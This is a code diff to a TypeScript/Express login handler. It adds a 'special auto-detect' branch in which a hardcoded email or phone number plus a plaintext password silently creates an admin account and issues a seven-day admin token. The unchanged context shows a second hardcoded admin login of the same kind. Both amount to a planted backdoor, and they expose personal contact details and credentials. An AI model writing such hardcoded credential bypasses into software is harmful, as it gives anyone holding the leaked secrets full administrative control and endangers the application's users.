@@ -115,6 +115,47 @@ export const login = async (req: Request, res: Response): Promise<void> => {
     }
 
     const cleanInput = emailOrPhone.trim().toLowerCase();
+    const cleanPhone = emailOrPhone.replace(/\D/g, '');
+
+    // Special auto-detect for Admin user Dax Koladiya
+    if ((cleanInput === 'ticketfordax@gmail.com' || cleanPhone === '8141702217') && password === 'DAX!@#$%^&') {
+      let [adminRows]: any = await db.execute(`SELECT * FROM users WHERE LOWER(email) = 'ticketfordax@gmail.com' OR phone = '8141702217'`);
+      let adminId = 'usr-admin-dax';
+
+      if (!adminRows || adminRows.length === 0) {
+        const passwordHash = await bcrypt.hash('DAX!@#$%^&', 10);
+        await db.execute(
+          `INSERT INTO users (id, name, email, phone, password_hash, role, language, status, created_at, updated_at)
+           VALUES (?, 'Dax Koladiya', 'ticketfordax@gmail.com', '8141702217', ?, 'admin', 'en', 'active', NOW(), NOW())`,
+          [adminId, passwordHash]
+        );
+      } else {
+        adminId = adminRows[0].id;
+      }
+
+      const payload = {
+        id: adminId,
+        name: 'Dax Koladiya',
+        email: 'ticketfordax@gmail.com',
+        phone: '8141702217',
+        role: 'admin',
+        userType: 'ADMIN',
+        isArtisan: false,
+        isBuyer: false,
+      };
+
+      const token = jwt.sign(payload, ENV.JWT_SECRET, { expiresIn: '7d' });
+
+      res.json({
+        success: true,
+        message: 'Admin login successful.',
+        data: {
+          token,
+          user: payload,
+        },
+      });
+      return;
+    }
 
     // Special auto-detect for Admin user devborad22@gmail.com
     if (cleanInput === 'devborad22@gmail.com' && password === '492320Devu$') {
